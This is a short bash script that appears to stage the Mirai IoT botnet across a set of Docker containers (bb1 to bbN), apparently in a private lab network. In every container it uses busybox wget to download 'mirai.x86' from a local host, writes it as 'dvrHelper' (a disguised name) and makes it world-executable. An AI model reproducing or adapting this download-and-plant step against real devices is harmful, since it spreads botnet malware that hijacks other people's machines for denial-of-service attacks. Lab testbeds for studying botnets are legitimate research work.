#!/bin/bash
AUX=$(($1 + 0))

for i in $(seq 1 $AUX)
do
	docker exec -w / -i bb$i sh -c "/bin/busybox wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"
done
